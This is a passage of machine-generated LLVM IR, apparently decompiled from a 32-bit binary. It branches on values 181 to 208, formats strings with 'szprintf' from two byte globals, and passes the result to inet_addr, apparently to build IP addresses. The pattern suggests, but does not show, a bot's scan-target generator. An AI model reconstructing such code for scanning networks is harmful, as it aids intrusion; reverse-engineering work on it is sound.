  %v2_804bd16 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd16, i32* @ebx, align 4
  %v5_804bd1d = call i32 @szprintf(i32 %v2_804bd16, i32 ptrtoint ([13 x i8]* @global_var_8059035.200 to i32), i32 %v1_804bd07, i32 %v1_804bcfb)
  br label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bcf2, %dec_label_pc_804bcfb
  %v12_804bd25 = icmp eq i32 %v11_8049ac4, 181
  %v1_804bd2c = icmp eq i1 %v12_804bd25, false
  br i1 %v1_804bd2c, label %dec_label_pc_804bd58, label %dec_label_pc_804bd2e

dec_label_pc_804bd2e:                             ; preds = %dec_label_pc_804bd25
  %v0_804bd2e = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bd2e = zext i8 %v0_804bd2e to i32
  store i32 %v1_804bd2e, i32* @edx, align 4
  %v0_804bd3a = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bd3a = zext i8 %v0_804bd3a to i32
  %v2_804bd49 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd49, i32* @ebx, align 4
  %v5_804bd50 = call i32 @szprintf(i32 %v2_804bd49, i32 ptrtoint ([13 x i8]* @global_var_8059042.201 to i32), i32 %v1_804bd3a, i32 %v1_804bd2e)
  br label %dec_label_pc_804bd58

dec_label_pc_804bd58:                             ; preds = %dec_label_pc_804bd25, %dec_label_pc_804bd2e
  %v12_804bd58 = icmp eq i32 %v11_8049ac4, 182
  %v1_804bd5f = icmp eq i1 %v12_804bd58, false
  br i1 %v1_804bd5f, label %dec_label_pc_804bd8b, label %dec_label_pc_804bd61

dec_label_pc_804bd61:                             ; preds = %dec_label_pc_804bd58
  %v0_804bd61 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bd61 = zext i8 %v0_804bd61 to i32
  store i32 %v1_804bd61, i32* @edx, align 4
  %v0_804bd6d = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bd6d = zext i8 %v0_804bd6d to i32
  %v2_804bd7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd7c, i32* @ebx, align 4
  %v5_804bd83 = call i32 @szprintf(i32 %v2_804bd7c, i32 ptrtoint ([13 x i8]* @global_var_805904f.202 to i32), i32 %v1_804bd6d, i32 %v1_804bd61)
  br label %dec_label_pc_804bd8b

dec_label_pc_804bd8b:                             ; preds = %dec_label_pc_804bd58, %dec_label_pc_804bd61
  %v12_804bd8b = icmp eq i32 %v11_8049ac4, 183
  %v1_804bd92 = icmp eq i1 %v12_804bd8b, false
  br i1 %v1_804bd92, label %dec_label_pc_804bdbe, label %dec_label_pc_804bd94

dec_label_pc_804bd94:                             ; preds = %dec_label_pc_804bd8b
  %v0_804bd94 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bd94 = zext i8 %v0_804bd94 to i32
  store i32 %v1_804bd94, i32* @edx, align 4
  %v0_804bda0 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bda0 = zext i8 %v0_804bda0 to i32
  %v2_804bdaf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdaf, i32* @ebx, align 4
  %v5_804bdb6 = call i32 @szprintf(i32 %v2_804bdaf, i32 ptrtoint ([13 x i8]* @global_var_805899a.73 to i32), i32 %v1_804bda0, i32 %v1_804bd94)
  br label %dec_label_pc_804bdbe

dec_label_pc_804bdbe:                             ; preds = %dec_label_pc_804bd8b, %dec_label_pc_804bd94
  %v12_804bdbe = icmp eq i32 %v11_8049ac4, 184
  %v1_804bdc5 = icmp eq i1 %v12_804bdbe, false
  br i1 %v1_804bdc5, label %dec_label_pc_804bdf1, label %dec_label_pc_804bdc7

dec_label_pc_804bdc7:                             ; preds = %dec_label_pc_804bdbe
  %v0_804bdc7 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bdc7 = zext i8 %v0_804bdc7 to i32
  store i32 %v1_804bdc7, i32* @edx, align 4
  %v0_804bdd3 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bdd3 = zext i8 %v0_804bdd3 to i32
  %v2_804bde2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bde2, i32* @ebx, align 4
  %v5_804bde9 = call i32 @szprintf(i32 %v2_804bde2, i32 ptrtoint ([13 x i8]* @global_var_805905c.203 to i32), i32 %v1_804bdd3, i32 %v1_804bdc7)
  br label %dec_label_pc_804bdf1

dec_label_pc_804bdf1:                             ; preds = %dec_label_pc_804bdbe, %dec_label_pc_804bdc7
  %v12_804bdf1 = icmp eq i32 %v11_8049ac4, 185
  %v1_804bdf8 = icmp eq i1 %v12_804bdf1, false
  br i1 %v1_804bdf8, label %dec_label_pc_804be24, label %dec_label_pc_804bdfa

dec_label_pc_804bdfa:                             ; preds = %dec_label_pc_804bdf1
  %v0_804bdfa = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bdfa = zext i8 %v0_804bdfa to i32
  store i32 %v1_804bdfa, i32* @edx, align 4
  %v0_804be06 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804be06 = zext i8 %v0_804be06 to i32
  %v2_804be15 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be15, i32* @ebx, align 4
  %v5_804be1c = call i32 @szprintf(i32 %v2_804be15, i32 ptrtoint ([13 x i8]* @global_var_8059069.204 to i32), i32 %v1_804be06, i32 %v1_804bdfa)
  br label %dec_label_pc_804be24

dec_label_pc_804be24:                             ; preds = %dec_label_pc_804bdf1, %dec_label_pc_804bdfa
  %v12_804be24 = icmp eq i32 %v11_8049ac4, 186
  %v1_804be2b = icmp eq i1 %v12_804be24, false
  br i1 %v1_804be2b, label %dec_label_pc_804be57, label %dec_label_pc_804be2d

dec_label_pc_804be2d:                             ; preds = %dec_label_pc_804be24
  %v0_804be2d = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804be2d = zext i8 %v0_804be2d to i32
  store i32 %v1_804be2d, i32* @edx, align 4
  %v0_804be39 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804be39 = zext i8 %v0_804be39 to i32
  %v2_804be48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be48, i32* @ebx, align 4
  %v5_804be4f = call i32 @szprintf(i32 %v2_804be48, i32 ptrtoint ([14 x i8]* @global_var_8059076.205 to i32), i32 %v1_804be39, i32 %v1_804be2d)
  br label %dec_label_pc_804be57

dec_label_pc_804be57:                             ; preds = %dec_label_pc_804be24, %dec_label_pc_804be2d
  %v12_804be57 = icmp eq i32 %v11_8049ac4, 187
  %v1_804be5e = icmp eq i1 %v12_804be57, false
  br i1 %v1_804be5e, label %dec_label_pc_804be8a, label %dec_label_pc_804be60

dec_label_pc_804be60:                             ; preds = %dec_label_pc_804be57
  %v0_804be60 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804be60 = zext i8 %v0_804be60 to i32
  store i32 %v1_804be60, i32* @edx, align 4
  %v0_804be6c = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804be6c = zext i8 %v0_804be6c to i32
  %v2_804be7b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be7b, i32* @ebx, align 4
  %v5_804be82 = call i32 @szprintf(i32 %v2_804be7b, i32 ptrtoint ([14 x i8]* @global_var_8059084.206 to i32), i32 %v1_804be6c, i32 %v1_804be60)
  br label %dec_label_pc_804be8a

dec_label_pc_804be8a:                             ; preds = %dec_label_pc_804be57, %dec_label_pc_804be60
  %v12_804be8a = icmp eq i32 %v11_8049ac4, 188
  %v1_804be91 = icmp eq i1 %v12_804be8a, false
  br i1 %v1_804be91, label %dec_label_pc_804bebd, label %dec_label_pc_804be93

dec_label_pc_804be93:                             ; preds = %dec_label_pc_804be8a
  %v0_804be93 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804be93 = zext i8 %v0_804be93 to i32
  store i32 %v1_804be93, i32* @edx, align 4
  %v0_804be9f = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804be9f = zext i8 %v0_804be9f to i32
  %v2_804beae = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beae, i32* @ebx, align 4
  %v5_804beb5 = call i32 @szprintf(i32 %v2_804beae, i32 ptrtoint ([14 x i8]* @global_var_8059092.207 to i32), i32 %v1_804be9f, i32 %v1_804be93)
  br label %dec_label_pc_804bebd

dec_label_pc_804bebd:                             ; preds = %dec_label_pc_804be8a, %dec_label_pc_804be93
  %v12_804bebd = icmp eq i32 %v11_8049ac4, 189
  %v1_804bec4 = icmp eq i1 %v12_804bebd, false
  br i1 %v1_804bec4, label %dec_label_pc_804bef0, label %dec_label_pc_804bec6

dec_label_pc_804bec6:                             ; preds = %dec_label_pc_804bebd
  %v0_804bec6 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bec6 = zext i8 %v0_804bec6 to i32
  store i32 %v1_804bec6, i32* @edx, align 4
  %v0_804bed2 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bed2 = zext i8 %v0_804bed2 to i32
  %v2_804bee1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bee1, i32* @ebx, align 4
  %v5_804bee8 = call i32 @szprintf(i32 %v2_804bee1, i32 ptrtoint ([14 x i8]* @global_var_80590a0.208 to i32), i32 %v1_804bed2, i32 %v1_804bec6)
  br label %dec_label_pc_804bef0

dec_label_pc_804bef0:                             ; preds = %dec_label_pc_804bebd, %dec_label_pc_804bec6
  %v12_804bef0 = icmp eq i32 %v11_8049ac4, 190
  %v1_804bef7 = icmp eq i1 %v12_804bef0, false
  br i1 %v1_804bef7, label %dec_label_pc_804bf23, label %dec_label_pc_804bef9

dec_label_pc_804bef9:                             ; preds = %dec_label_pc_804bef0
  %v0_804bef9 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bef9 = zext i8 %v0_804bef9 to i32
  store i32 %v1_804bef9, i32* @edx, align 4
  %v0_804bf05 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bf05 = zext i8 %v0_804bf05 to i32
  %v2_804bf14 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf14, i32* @ebx, align 4
  %v5_804bf1b = call i32 @szprintf(i32 %v2_804bf14, i32 ptrtoint ([14 x i8]* @global_var_80590ae.209 to i32), i32 %v1_804bf05, i32 %v1_804bef9)
  br label %dec_label_pc_804bf23

dec_label_pc_804bf23:                             ; preds = %dec_label_pc_804bef0, %dec_label_pc_804bef9
  %v12_804bf23 = icmp eq i32 %v11_8049ac4, 191
  %v1_804bf2a = icmp eq i1 %v12_804bf23, false
  br i1 %v1_804bf2a, label %dec_label_pc_804bf56, label %dec_label_pc_804bf2c

dec_label_pc_804bf2c:                             ; preds = %dec_label_pc_804bf23
  %v0_804bf2c = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bf2c = zext i8 %v0_804bf2c to i32
  store i32 %v1_804bf2c, i32* @edx, align 4
  %v0_804bf38 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bf38 = zext i8 %v0_804bf38 to i32
  %v2_804bf47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf47, i32* @ebx, align 4
  %v5_804bf4e = call i32 @szprintf(i32 %v2_804bf47, i32 ptrtoint ([14 x i8]* @global_var_80590bc.210 to i32), i32 %v1_804bf38, i32 %v1_804bf2c)
  br label %dec_label_pc_804bf56

dec_label_pc_804bf56:                             ; preds = %dec_label_pc_804bf23, %dec_label_pc_804bf2c
  %v9_804bf56 = icmp eq i32 %v11_8049ac4, 192
  %v1_804bf5d = icmp eq i1 %v9_804bf56, false
  br i1 %v1_804bf5d, label %dec_label_pc_804bf89, label %dec_label_pc_804bf5f

dec_label_pc_804bf5f:                             ; preds = %dec_label_pc_804bf56
  %v0_804bf5f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bf5f = zext i8 %v0_804bf5f to i32
  store i32 %v1_804bf5f, i32* @edx, align 4
  %v0_804bf6b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bf6b = zext i8 %v0_804bf6b to i32
  %v2_804bf7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf7a, i32* @ebx, align 4
  %v5_804bf81 = call i32 @szprintf(i32 %v2_804bf7a, i32 ptrtoint ([13 x i8]* @global_var_80590ca.211 to i32), i32 %v1_804bf6b, i32 %v1_804bf5f)
  br label %dec_label_pc_804bf89

dec_label_pc_804bf89:                             ; preds = %dec_label_pc_804bf56, %dec_label_pc_804bf5f
  %v12_804bf89 = icmp eq i32 %v11_8049ac4, 193
  %v1_804bf90 = icmp eq i1 %v12_804bf89, false
  br i1 %v1_804bf90, label %dec_label_pc_804bfbc, label %dec_label_pc_804bf92

dec_label_pc_804bf92:                             ; preds = %dec_label_pc_804bf89
  %v0_804bf92 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bf92 = zext i8 %v0_804bf92 to i32
  store i32 %v1_804bf92, i32* @edx, align 4
  %v0_804bf9e = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bf9e = zext i8 %v0_804bf9e to i32
  %v2_804bfad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfad, i32* @ebx, align 4
  %v5_804bfb4 = call i32 @szprintf(i32 %v2_804bfad, i32 ptrtoint ([13 x i8]* @global_var_80590d7.212 to i32), i32 %v1_804bf9e, i32 %v1_804bf92)
  br label %dec_label_pc_804bfbc

dec_label_pc_804bfbc:                             ; preds = %dec_label_pc_804bf89, %dec_label_pc_804bf92
  %v12_804bfbc = icmp eq i32 %v11_8049ac4, 194
  %v1_804bfc3 = icmp eq i1 %v12_804bfbc, false
  br i1 %v1_804bfc3, label %dec_label_pc_804bfef, label %dec_label_pc_804bfc5

dec_label_pc_804bfc5:                             ; preds = %dec_label_pc_804bfbc
  %v0_804bfc5 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bfc5 = zext i8 %v0_804bfc5 to i32
  store i32 %v1_804bfc5, i32* @edx, align 4
  %v0_804bfd1 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bfd1 = zext i8 %v0_804bfd1 to i32
  %v2_804bfe0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfe0, i32* @ebx, align 4
  %v5_804bfe7 = call i32 @szprintf(i32 %v2_804bfe0, i32 ptrtoint ([14 x i8]* @global_var_80590e4.213 to i32), i32 %v1_804bfd1, i32 %v1_804bfc5)
  br label %dec_label_pc_804bfef

dec_label_pc_804bfef:                             ; preds = %dec_label_pc_804bfbc, %dec_label_pc_804bfc5
  %v12_804bfef = icmp eq i32 %v11_8049ac4, 195
  %v1_804bff6 = icmp eq i1 %v12_804bfef, false
  br i1 %v1_804bff6, label %dec_label_pc_804c022, label %dec_label_pc_804bff8

dec_label_pc_804bff8:                             ; preds = %dec_label_pc_804bfef
  %v0_804bff8 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bff8 = zext i8 %v0_804bff8 to i32
  store i32 %v1_804bff8, i32* @edx, align 4
  %v0_804c004 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c004 = zext i8 %v0_804c004 to i32
  %v2_804c013 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c013, i32* @ebx, align 4
  %v5_804c01a = call i32 @szprintf(i32 %v2_804c013, i32 ptrtoint ([14 x i8]* @global_var_80590f2.214 to i32), i32 %v1_804c004, i32 %v1_804bff8)
  br label %dec_label_pc_804c022

dec_label_pc_804c022:                             ; preds = %dec_label_pc_804bfef, %dec_label_pc_804bff8
  %v12_804c022 = icmp eq i32 %v11_8049ac4, 196
  %v1_804c029 = icmp eq i1 %v12_804c022, false
  br i1 %v1_804c029, label %dec_label_pc_804c055, label %dec_label_pc_804c02b

dec_label_pc_804c02b:                             ; preds = %dec_label_pc_804c022
  %v0_804c02b = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c02b = zext i8 %v0_804c02b to i32
  store i32 %v1_804c02b, i32* @edx, align 4
  %v0_804c037 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c037 = zext i8 %v0_804c037 to i32
  %v2_804c046 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c046, i32* @ebx, align 4
  %v5_804c04d = call i32 @szprintf(i32 %v2_804c046, i32 ptrtoint ([14 x i8]* @global_var_8059100.215 to i32), i32 %v1_804c037, i32 %v1_804c02b)
  br label %dec_label_pc_804c055

dec_label_pc_804c055:                             ; preds = %dec_label_pc_804c022, %dec_label_pc_804c02b
  %v12_804c055 = icmp eq i32 %v11_8049ac4, 197
  %v1_804c05c = icmp eq i1 %v12_804c055, false
  br i1 %v1_804c05c, label %dec_label_pc_804c088, label %dec_label_pc_804c05e

dec_label_pc_804c05e:                             ; preds = %dec_label_pc_804c055
  %v0_804c05e = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c05e = zext i8 %v0_804c05e to i32
  store i32 %v1_804c05e, i32* @edx, align 4
  %v0_804c06a = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c06a = zext i8 %v0_804c06a to i32
  %v2_804c079 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c079, i32* @ebx, align 4
  %v5_804c080 = call i32 @szprintf(i32 %v2_804c079, i32 ptrtoint ([14 x i8]* @global_var_805910e.216 to i32), i32 %v1_804c06a, i32 %v1_804c05e)
  br label %dec_label_pc_804c088

dec_label_pc_804c088:                             ; preds = %dec_label_pc_804c055, %dec_label_pc_804c05e
  %v12_804c088 = icmp eq i32 %v11_8049ac4, 198
  %v1_804c08f = icmp eq i1 %v12_804c088, false
  br i1 %v1_804c08f, label %dec_label_pc_804c0bb, label %dec_label_pc_804c091

dec_label_pc_804c091:                             ; preds = %dec_label_pc_804c088
  %v0_804c091 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c091 = zext i8 %v0_804c091 to i32
  store i32 %v1_804c091, i32* @edx, align 4
  %v0_804c09d = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c09d = zext i8 %v0_804c09d to i32
  %v2_804c0ac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0ac, i32* @ebx, align 4
  %v5_804c0b3 = call i32 @szprintf(i32 %v2_804c0ac, i32 ptrtoint ([14 x i8]* @global_var_805911c.217 to i32), i32 %v1_804c09d, i32 %v1_804c091)
  br label %dec_label_pc_804c0bb

dec_label_pc_804c0bb:                             ; preds = %dec_label_pc_804c088, %dec_label_pc_804c091
  %v12_804c0bb = icmp eq i32 %v11_8049ac4, 199
  %v1_804c0c2 = icmp eq i1 %v12_804c0bb, false
  br i1 %v1_804c0c2, label %dec_label_pc_804c0ee, label %dec_label_pc_804c0c4

dec_label_pc_804c0c4:                             ; preds = %dec_label_pc_804c0bb
  %v0_804c0c4 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c0c4 = zext i8 %v0_804c0c4 to i32
  store i32 %v1_804c0c4, i32* @edx, align 4
  %v0_804c0d0 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c0d0 = zext i8 %v0_804c0d0 to i32
  %v2_804c0df = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0df, i32* @ebx, align 4
  %v5_804c0e6 = call i32 @szprintf(i32 %v2_804c0df, i32 ptrtoint ([14 x i8]* @global_var_805912a.218 to i32), i32 %v1_804c0d0, i32 %v1_804c0c4)
  br label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0bb, %dec_label_pc_804c0c4
  %v12_804c0ee = icmp eq i32 %v11_8049ac4, 200
  %v1_804c0f5 = icmp eq i1 %v12_804c0ee, false
  br i1 %v1_804c0f5, label %dec_label_pc_804c121, label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804c0ee
  %v0_804c0f7 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c0f7 = zext i8 %v0_804c0f7 to i32
  store i32 %v1_804c0f7, i32* @edx, align 4
  %v0_804c103 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c103 = zext i8 %v0_804c103 to i32
  %v2_804c112 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c112, i32* @ebx, align 4
  %v5_804c119 = call i32 @szprintf(i32 %v2_804c112, i32 ptrtoint ([14 x i8]* @global_var_8059138.219 to i32), i32 %v1_804c103, i32 %v1_804c0f7)
  br label %dec_label_pc_804c121

dec_label_pc_804c121:                             ; preds = %dec_label_pc_804c0ee, %dec_label_pc_804c0f7
  %v12_804c121 = icmp eq i32 %v11_8049ac4, 201
  %v1_804c128 = icmp eq i1 %v12_804c121, false
  br i1 %v1_804c128, label %dec_label_pc_804c154.thread, label %dec_label_pc_804c15d

dec_label_pc_804c154.thread:                      ; preds = %dec_label_pc_804c121
  br label %dec_label_pc_804c187

dec_label_pc_804c15d:                             ; preds = %dec_label_pc_804c121
  %v0_804c12a = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c12a = zext i8 %v0_804c12a to i32
  %v0_804c136 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c136 = zext i8 %v0_804c136 to i32
  %v2_804c145 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c145, i32* @ebx, align 4
  %v5_804c14c = call i32 @szprintf(i32 %v2_804c145, i32 ptrtoint ([14 x i8]* @global_var_8059146.220 to i32), i32 %v1_804c136, i32 %v1_804c12a)
  %v0_804c15d = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c15d = zext i8 %v0_804c15d to i32
  store i32 %v1_804c15d, i32* @edx, align 4
  %v0_804c169 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c169 = zext i8 %v0_804c169 to i32
  store i32 %v2_804c145, i32* @ebx, align 4
  %v5_804c17f = call i32 @szprintf(i32 %v2_804c145, i32 ptrtoint ([13 x i8]* @global_var_8059154.221 to i32), i32 %v1_804c169, i32 %v1_804c15d)
  br label %dec_label_pc_804c187

dec_label_pc_804c187:                             ; preds = %dec_label_pc_804c154.thread, %dec_label_pc_804c15d
  %v12_804c187 = icmp eq i32 %v11_8049ac4, 202
  %v1_804c18e = icmp eq i1 %v12_804c187, false
  br i1 %v1_804c18e, label %dec_label_pc_804c1ba, label %dec_label_pc_804c190

dec_label_pc_804c190:                             ; preds = %dec_label_pc_804c187
  %v0_804c190 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c190 = zext i8 %v0_804c190 to i32
  store i32 %v1_804c190, i32* @edx, align 4
  %v0_804c19c = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c19c = zext i8 %v0_804c19c to i32
  %v2_804c1ab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1ab, i32* @ebx, align 4
  %v5_804c1b2 = call i32 @szprintf(i32 %v2_804c1ab, i32 ptrtoint ([13 x i8]* @global_var_8059161.222 to i32), i32 %v1_804c19c, i32 %v1_804c190)
  br label %dec_label_pc_804c1ba

dec_label_pc_804c1ba:                             ; preds = %dec_label_pc_804c187, %dec_label_pc_804c190
  %v12_804c1ba = icmp eq i32 %v11_8049ac4, 203
  %v1_804c1c1 = icmp eq i1 %v12_804c1ba, false
  br i1 %v1_804c1c1, label %dec_label_pc_804c1ed, label %dec_label_pc_804c1c3

dec_label_pc_804c1c3:                             ; preds = %dec_label_pc_804c1ba
  %v0_804c1c3 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c1c3 = zext i8 %v0_804c1c3 to i32
  store i32 %v1_804c1c3, i32* @edx, align 4
  %v0_804c1cf = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c1cf = zext i8 %v0_804c1cf to i32
  %v2_804c1de = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1de, i32* @ebx, align 4
  %v5_804c1e5 = call i32 @szprintf(i32 %v2_804c1de, i32 ptrtoint ([13 x i8]* @global_var_805916e.223 to i32), i32 %v1_804c1cf, i32 %v1_804c1c3)
  br label %dec_label_pc_804c1ed

dec_label_pc_804c1ed:                             ; preds = %dec_label_pc_804c1ba, %dec_label_pc_804c1c3
  %v12_804c1ed = icmp eq i32 %v11_8049ac4, 204
  %v1_804c1f4 = icmp eq i1 %v12_804c1ed, false
  br i1 %v1_804c1f4, label %dec_label_pc_804c220, label %dec_label_pc_804c1f6

dec_label_pc_804c1f6:                             ; preds = %dec_label_pc_804c1ed
  %v0_804c1f6 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c1f6 = zext i8 %v0_804c1f6 to i32
  store i32 %v1_804c1f6, i32* @edx, align 4
  %v0_804c202 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c202 = zext i8 %v0_804c202 to i32
  %v2_804c211 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c211, i32* @ebx, align 4
  %v5_804c218 = call i32 @szprintf(i32 %v2_804c211, i32 ptrtoint ([13 x i8]* @global_var_805917b.224 to i32), i32 %v1_804c202, i32 %v1_804c1f6)
  br label %dec_label_pc_804c220

dec_label_pc_804c220:                             ; preds = %dec_label_pc_804c1ed, %dec_label_pc_804c1f6
  %v12_804c220 = icmp eq i32 %v11_8049ac4, 205
  %v1_804c227 = icmp eq i1 %v12_804c220, false
  br i1 %v1_804c227, label %dec_label_pc_804c253, label %dec_label_pc_804c229

dec_label_pc_804c229:                             ; preds = %dec_label_pc_804c220
  %v0_804c229 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c229 = zext i8 %v0_804c229 to i32
  store i32 %v1_804c229, i32* @edx, align 4
  %v0_804c235 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c235 = zext i8 %v0_804c235 to i32
  %v2_804c244 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c244, i32* @ebx, align 4
  %v5_804c24b = call i32 @szprintf(i32 %v2_804c244, i32 ptrtoint ([13 x i8]* @global_var_8059188.225 to i32), i32 %v1_804c235, i32 %v1_804c229)
  br label %dec_label_pc_804c253

dec_label_pc_804c253:                             ; preds = %dec_label_pc_804c220, %dec_label_pc_804c229
  %v12_804c253 = icmp eq i32 %v11_8049ac4, 206
  %v1_804c25a = icmp eq i1 %v12_804c253, false
  br i1 %v1_804c25a, label %dec_label_pc_804c286, label %dec_label_pc_804c25c

dec_label_pc_804c25c:                             ; preds = %dec_label_pc_804c253
  %v0_804c25c = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c25c = zext i8 %v0_804c25c to i32
  store i32 %v1_804c25c, i32* @edx, align 4
  %v0_804c268 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c268 = zext i8 %v0_804c268 to i32
  %v2_804c277 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c277, i32* @ebx, align 4
  %v5_804c27e = call i32 @szprintf(i32 %v2_804c277, i32 ptrtoint ([13 x i8]* @global_var_8059195.226 to i32), i32 %v1_804c268, i32 %v1_804c25c)
  br label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c253, %dec_label_pc_804c25c
  %v12_804c286 = icmp eq i32 %v11_8049ac4, 207
  %v1_804c28d = icmp eq i1 %v12_804c286, false
  br i1 %v1_804c28d, label %dec_label_pc_804c2b9, label %dec_label_pc_804c28f

dec_label_pc_804c28f:                             ; preds = %dec_label_pc_804c286
  %v0_804c28f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c28f = zext i8 %v0_804c28f to i32
  store i32 %v1_804c28f, i32* @edx, align 4
  %v0_804c29b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c29b = zext i8 %v0_804c29b to i32
  %v2_804c2aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2aa, i32* @ebx, align 4
  %v5_804c2b1 = call i32 @szprintf(i32 %v2_804c2aa, i32 ptrtoint ([14 x i8]* @global_var_80591a2.227 to i32), i32 %v1_804c29b, i32 %v1_804c28f)
  br label %dec_label_pc_804c2b9

dec_label_pc_804c2b9:                             ; preds = %dec_label_pc_804c286, %dec_label_pc_804c28f
  %v9_804c2b9 = icmp eq i32 %v11_8049ac4, 208
  %v1_804c2c0 = icmp eq i1 %v9_804c2b9, false
  br i1 %v1_804c2c0, label %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge, label %dec_label_pc_804c2c2

dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge: ; preds = %dec_label_pc_804c2b9
  %.pre101 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804c2ec

dec_label_pc_804c2c2:                             ; preds = %dec_label_pc_804c2b9
  %v0_804c2c2 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804c2c2 = zext i8 %v0_804c2c2 to i32
  store i32 %v1_804c2c2, i32* @edx, align 4
  %v0_804c2ce = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804c2ce = zext i8 %v0_804c2ce to i32
  %v2_804c2dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2dd, i32* @ebx, align 4
  %v5_804c2e4 = call i32 @szprintf(i32 %v2_804c2dd, i32 ptrtoint ([13 x i8]* @global_var_80591b0.228 to i32), i32 %v1_804c2ce, i32 %v1_804c2c2)
  br label %dec_label_pc_804c2ec

dec_label_pc_804c2ec:                             ; preds = %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge, %dec_label_pc_804c2c2
  %v2_804c2ef.pre-phi = phi i32 [ %.pre101, %dec_label_pc_804c2b9.dec_label_pc_804c2ec_crit_edge ], [ %v2_804c2dd, %dec_label_pc_804c2c2 ]
  %v1_804c2f3 = call i32 @inet_addr(i32 %v2_804c2ef.pre-phi)
  %v3_804c2fb = load i32, i32* %stack_var_-8, align 4
